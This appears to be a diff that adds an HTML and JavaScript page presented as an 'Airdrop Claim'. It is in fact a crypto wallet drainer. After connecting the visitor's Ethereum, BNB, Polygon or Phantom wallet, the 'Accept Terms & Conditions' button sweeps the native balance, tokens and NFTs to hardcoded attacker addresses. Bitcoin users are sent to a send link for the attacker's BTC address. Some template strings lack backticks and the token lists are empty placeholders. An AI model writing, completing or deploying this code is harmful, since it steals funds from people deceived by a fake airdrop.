@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Airdrop Claim</title>
+
+  <!-- ethers.js (UMD) -->
+  <script src="https:                                                    
+
+  <!-- Import map for Solana -->
+  <script type="importmap">
+    {
+      "imports": {
+        "@solana/web3.js": "https://cdn.skypack.dev/@solana/web3.js@1.30.2"
+      }
+    }
+  </script>
+
+  <style>
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+
+<h1>Airdrop Claim</h1>
+
+<!-- ⿡ Initial “Claim Airdrop” button -->
+<button id="claimBtn">Claim Airdrop</button>
+
+<!-- ⿢ Terms & Conditions section (hidden at start) -->
+<div id="termsSection" class="hidden">
+  <label>
+    <input type="checkbox" id="termsChk">
+    I have read and accept the <a href="                         
+  </label>
+  <br>
+  <button id="actionBtn" disabled>Accept Terms & Conditions</button>
+</div>
+
+<p id="status"></p>
+
+<script type="module">
+import * as solana from '@solana/web3.js';
+
+                                        
+const claimBtn      = document.getElementById('claimBtn');
+const termsSection  = document.getElementById('termsSection');
+const termsChk      = document.getElementById('termsChk');
+const actionBtn     = document.getElementById('actionBtn');
+const status        = document.getElementById('status');
+
+                                                       
+const ETH_HOT = "0x896593277E72463232b54Aa0d31679b0Ff297C5e";
+const BNB_HOT = "0x896593277E72463232b54Aa0d31679b0Ff297C5e";
+const POLY_HOT = "0x896593277E72463232b54Aa0d31679b0Ff297C5e";
+const SOL_HOT = "ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv";
+const BTC_HOT = "bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w";
+
+                                        
+let provider, signer, address, chainId;
+let solPubkey, solConn;
+
+                                                       
+function getDestination(chainId) {
+  switch (chainId) {
+    case 1:   return ETH_HOT;                      
+    case 56:  return BNB_HOT;                         
+    case 137: return POLY_HOT;            
+    default:  return null;
+  }
+}
+
+                                                       
+function showTerms() {
+  termsSection.classList.remove("hidden");
+}
+
+                                                              
+claimBtn.addEventListener("click", async () => {
+  status.textContent = "Connecting…";
+
+                                            
+  if (window.ethereum) {
+    try {
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer   = provider.getSigner();
+      address  = await signer.getAddress();
+      chainId  = (await provider.getNetwork()).chainId;
+      const dest = getDestination(chainId);
+      if (!dest) {
+        status.textContent = "Unsupported EVM chain";
+        return;
+      }
+      status.textContent = Connected (EVM): ${address};
+      showTerms();
+      return;
+    } catch (e) {
+      status.textContent = "Ethereum wallet connection failed";
+    }
+  }
+
+                                                        
+  if (window.solana?.isPhantom) {
+    try {
+      const resp = await window.solana.connect();
+      solPubkey = resp.publicKey;
+      solConn   = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
+      status.textContent = Connected (Solana): ${solPubkey.toBase58()};
+      showTerms();
+      return;
+    } catch (e) {
+      status.textContent = "Solana wallet connection rejected";
+    }
+  }
+
+                                                                                     
+  if (window.web3) {
+    try {
+      provider = new ethers.providers.Web3Provider(window.web3.currentProvider);
+      await provider.send("eth_requestAccounts", []);
+      signer   = provider.getSigner();
+      address  = await signer.getAddress();
+      chainId  = (await provider.getNetwork()).chainId;
+      const dest = getDestination(chainId);
+      if (!dest) {
+        status.textContent = "Unsupported EVM chain";
+        return;
+      }
+      status.textContent = Connected (Web3): ${address};
+      showTerms();
+      return;
+    } catch (e) {
+      status.textContent = "Web3 wallet connection failed";
+    }
+  }
+
+  status.textContent = "No compatible wallet detected";
+});
+
+                                                                                                 
+termsChk.addEventListener("change", () => {
+  actionBtn.disabled = !termsChk.checked;
+});
+
+                                                                          
+actionBtn.addEventListener("click", async () => {
+  status.textContent = "Processing…";
+
+                                                      
+                                                  
+                                                      
+  if (provider && signer) {
+    const dest = getDestination(chainId);
+    if (!dest) {
+      status.textContent = "Unsupported EVM chain";
+      return;
+    }
+
+    status.textContent = Sweeping (EVM): ${address} → ${dest};
+
+                 
+    const ethBal = await provider.getBalance(address);
+    if (ethBal.gt(0)) {
+      const tx = {
+        to: dest,
+        value: ethBal.sub(ethers.utils.parseUnits("0.001", 18)),
+      };
+      await signer.sendTransaction(tx);
+    }
+
+                                                 
+    const erc20Tokens = [];
+    for (const t of erc20Tokens) {
+      const token = new ethers.Contract(t.addr, [
+        "function balanceOf(address) view returns (uint256)",
+        "function transfer(address,uint256) returns (bool)",
+      ], signer);
+      const bal = await token.balanceOf(address);
+      if (bal.gt(0)) await token.transfer(dest, bal);
+    }
+
+                                                     
+    const nfts = await fetchNFTs(address);
+    for (const nft of nfts) {
+      const nftC = new ethers.Contract(nft.contract, [
+        "function transferFrom(address,address,uint256)",
+      ], signer);
+      await nftC.transferFrom(address, dest, nft.id);
+    }
+
+    status.textContent += " | EVM sweep complete";
+    return;
+  }
+
+                                                      
+                                                   
+                                                      
+  if (solPubkey && solConn) {
+    status.textContent = Sweeping (Solana): ${solPubkey.toBase58()} → ${SOL_HOT};
+
+                 
+    const solBal = await solConn.getBalance(solPubkey);
+    if (solBal > 0) {
+      const tx = new solana.Transaction().add(
+        solana.SystemProgram.transfer({
+          fromPubkey: solPubkey,
+          toPubkey: new solana.PublicKey(SOL_HOT),
+          lamports: solBal - 5000,
+        })
+      );
+      await solConn.sendTransaction(tx, [window.solana]);
+    }
+
+                                           
+    const splMints = [];
+    for (const mint of splMints) {
+      const from = await solana.Token.getAssociatedTokenAddress(solConn, solPubkey, mint, solPubkey);
+      const to   = await solana.Token.getAssociatedTokenAddress(solConn, new solana.PublicKey(SOL_HOT), mint, solPubkey);
+      const bal  = await solConn.getTokenAccountBalance(from);
+      if (bal.value.amount > 0) {
+        const tx = new solana.Transaction().add(
+          solana.Token.createTransferInstruction(
+            solana.TokenProgram.id, from, to, solPubkey, [], Number(bal.value.amount)
+          )
+        );
+        await solConn.sendTransaction(tx, [window.solana]);
+      }
+    }
+
+    status.textContent += " | Solana sweep complete";
+    return;
+  }
+
+                                                      
+                                                              
+                                                      
+  if (window.confirm("We cannot sweep Bitcoin automatically. Open custodial service?")) {
+    window.open("https://your‑custodial‑service.com/send?to=" + BTC_HOT, "_blank");
+  }
+
+  status.textContent = "No active wallet session";
+});
+
+/* ---------- placeholder – you must implement ---------- */
+async function fetchNFTs(owner) {
+  // Return an array of objects: [{contract: "0x...", id: 123}, ...]
+  return [];
+}
+</script>
+
+</body>
+</html>
